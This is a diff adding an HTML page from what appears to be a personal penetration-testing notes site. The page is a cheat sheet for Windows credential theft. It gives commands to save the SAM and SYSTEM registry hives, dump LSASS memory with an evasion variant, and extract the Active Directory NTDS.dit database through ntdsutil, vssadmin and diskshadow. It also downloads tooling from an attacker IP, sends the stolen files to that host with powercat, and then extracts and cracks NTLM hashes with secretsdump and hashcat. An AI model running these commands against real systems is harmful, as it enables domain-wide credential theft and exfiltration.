@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Account hunting & data exfiltration - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Account hunting \u0026amp; data exfiltration", url: "#_top", children: [
+              {title: "SAM / SECURITY / SYSTEM", url: "#sam-security-system" },
+              {title: "LSASS MEMORY DUMPING", url: "#lsass-memory-dumping" },
+              {title: "Obtaining NTDS.dit Using ntdsutil", url: "#obtaining-ntdsdit-using-ntdsutil" },
+              {title: "Obtaining NTDS.dit Using vssadmin", url: "#obtaining-ntdsdit-using-vssadmin" },
+              {title: "Obtaining NTDS.dit Using shadow copy (SeBackup)", url: "#obtaining-ntdsdit-using-shadow-copy-sebackup" },
+              {title: "Rebuild AD Hashes", url: "#rebuild-ad-hashes" },
+              {title: "Install your NVIDIA Driver for GPU Power", url: "#install-your-nvidia-driver-for-gpu-power" },
+              {title: "Cracking", url: "#cracking" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h2 id="account-hunting-data-exfiltration">Account hunting &amp; data exfiltration</h2>
+<h3 id="sam-security-system">SAM / SECURITY / SYSTEM</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">sam</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">SAM</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">security</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">SECURITY</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">SYSTEM</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c"># REBUILD</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-sam</span> <span class="n">SAM</span> <span class="n">-security</span> <span class="n">SECURITY</span> <span class="n">-system</span> <span class="n">SYSTEM</span> <span class="n">LOCAL</span>
+</span></code></pre></div>
+<h3 id="lsass-memory-dumping">LSASS MEMORY DUMPING</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># NORMAL</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">.\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-accepteula</span> <span class="n">-ma</span> <span class="n">lsass</span> <span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c"># STRING EVASION, REPLACE WITH PID</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="p">.\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-accepteula</span> <span class="n">-ma</span> <span class="n">process_PID</span> <span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c"># REBUILD</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">pypykatz</span> <span class="n">lsa</span> <span class="n">minidump</span> <span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span> 
+</span></code></pre></div>
+<h3 id="obtaining-ntdsdit-using-ntdsutil">Obtaining NTDS.dit Using ntdsutil</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ntdsutil
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>activate instance ntds
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>ifm
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>create full C:\ntdsutil
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>quit
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>quit
+</span></code></pre></div>
+<h3 id="obtaining-ntdsdit-using-vssadmin">Obtaining NTDS.dit Using vssadmin</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>mkdir c:\extract
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>REM -&gt; c:\Windows\system32
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>vssadmin create shadow /for=c:
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\ntds\ntds.dit c:\extract\ntds.dit
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>reg SAVE HKLM\SYSTEM c:\extract\SYS
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>REM yes
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>REM exfiltrate to your attacker computer
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>REM housekeeping
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>vssadmin delete shadows /shadow={PATH} /Quiet
+</span></code></pre></div>
+<h3 id="obtaining-ntdsdit-using-shadow-copy-sebackup">Obtaining NTDS.dit Using shadow copy (SeBackup)</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># Create  script.txt file that will contain the shadow copy process script</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c">#Script -&gt;{</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">set </span><span class="n">context</span> <span class="n">persistent</span> <span class="n">nowriters</span>  
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="nb">set </span><span class="n">metadata</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">spool</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">color</span><span class="p">\</span><span class="n">example</span><span class="p">.</span><span class="n">cab</span>  
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nb">set </span><span class="n">verbose</span> <span class="n">on</span>  
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="k">begin</span> <span class="n">backup</span>  
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">add</span> <span class="n">volume</span> <span class="n">c</span><span class="p">:</span> <span class="k">alias</span> <span class="n">mydrive</span>  
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">create</span>  
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="n">expose</span> <span class="k">%</span><span class="n">mydrive</span><span class="p">%</span> <span class="n">w</span><span class="p">:</span>  
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="k">end</span> <span class="n">backup</span>  
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="c">#}</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="c"># TRANSFERT TO TARGET SYSTEM</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://10.10.10.10/script.txt&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;C:\\windows\\system32\\spool\\drivers\\color\\script.txt&quot;</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="c"># EXEC DISKSHADOW</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">spool</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">color</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="n">diskshadow</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">script</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="c"># CHECK THE CAB</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="nb">ls</span>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="n">-a</span><span class="p">----</span>         <span class="n">6</span><span class="p">/</span><span class="n">7</span><span class="p">/</span><span class="n">2020</span>   <span class="n">9</span><span class="p">:</span><span class="n">31</span> <span class="n">PM</span>            <span class="n">743</span> <span class="n">example</span><span class="p">.</span><span class="n">cab</span>
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a><span class="c"># IMPORTING DLL SeBackupPrivilegeCmdLets &amp; SeBackupPrivilegeUtils</span>
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://10.10.10.10/SeBackupPrivilegeCmdLets.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeCmdLets.dll&quot;</span>
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://10.10.10.10/SeBackupPrivilegeUtils.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeUtils.dll&quot;</span>
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a><span class="c"># CHECK MODULE</span>
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="nb">get-help</span> <span class="n">SeBackupPrivilege</span>
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="n">Name</span>                              <span class="n">Category</span>  <span class="n">Module</span>                    <span class="n">Synopsis</span>
+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="p">----</span>                              <span class="p">--------</span>  <span class="p">------</span>                    <span class="p">--------</span>
+</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a><span class="nb">Get-SeBackupPrivilege</span>             <span class="n">Cmdlet</span>    <span class="n">SeBackupPrivilegeCmdLets</span>  <span class="p">...</span>
+</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a><span class="nb">Set-SeBackupPrivilege</span>             <span class="n">Cmdlet</span>    <span class="n">SeBackupPrivilegeCmdLets</span>  <span class="p">...</span>
+</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="nb">Copy-FileSeBackupPrivilege</span>        <span class="n">Cmdlet</span>    <span class="n">SeBackupPrivilegeCmdLets</span>  <span class="p">...</span>
+</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>
+</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="c">#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice</span>
+</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="n">w</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">-Overwrite</span>
+</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>
+</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a><span class="c"># Dump ACTUAL SYSTEM hive</span>
+</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span> 
+</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>
+</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a><span class="c"># FILE TRANSFERT</span>
+</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a><span class="n">powercat</span> <span class="n">-c</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-p</span> <span class="n">443</span> <span class="n">-i</span> <span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span>
+</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a><span class="n">powercat</span> <span class="n">-c</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-p</span> <span class="n">443</span> <span class="n">-i</span> <span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span>
+</span></code></pre></div>
+<hr />
+<h3 id="rebuild-ad-hashes">Rebuild AD Hashes</h3>
+<ul>
+<li>-ntds: location and name of the ntds.dit file</li>
+<li>-system: location and name of the SYSTEM hive</li>
+<li>-hashes lmnhash:nthash: NTLM hash</li>
+<li>LOCAL: parse files on the local system</li>
+<li>-outputfile: location and name of the output file. Extensions are automatically added based on content extracted
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># impacket
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>secretsdump.py -ntds ntds.dit -system SYS -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+</span></code></pre></div></li>
+</ul>
+<hr />
+<h3 id="install-your-nvidia-driver-for-gpu-power">Install your NVIDIA Driver for GPU Power</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>apt install -y nvidia-driver nvidia-cuda-toolkit
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>apt install -y mesa-utils
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a># CHECK
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>nvidia-smi
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a># CHECK
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>nvidia-smi -i 0 -q
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a># CHECK
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>glxinfo | grep -i &quot;direct rendering&quot;
+</span></code></pre></div>
+<hr />
+<h3 id="cracking">Cracking</h3>
+<ul>
+<li>-m 1000: NTLM | Operating Systems</li>
+<li>ntlm-extract.ntds: secretsdump outfile</li>
+<li>/usr/share/wordlists/rockyou.txt: plaintext wordlist</li>
+<li>-o: location of cracked hash
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>hashcat -m 1000 ntlm-extract.ntds /usr/share/wordlists/rockyou.txt -o cracked
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>cat cracked 
+</span></code></pre></div></li>
+</ul>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/network/data_exfiltration/Account hunting & data exfiltration.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
